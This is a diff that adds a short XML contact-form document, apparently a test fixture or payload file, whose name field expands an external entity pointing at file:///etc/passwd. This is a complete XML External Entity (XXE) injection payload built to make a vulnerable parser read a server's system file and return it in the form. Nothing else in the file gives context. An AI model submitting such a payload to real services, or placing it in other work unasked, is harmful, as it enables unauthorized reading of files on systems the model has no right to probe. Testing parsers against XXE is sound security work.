@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE contact [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<contact>
+  <name>&xxe;</name>
+  <email>x@x</email>
+  <subject>x</subject>
+  <message>x</message>
+</contact>
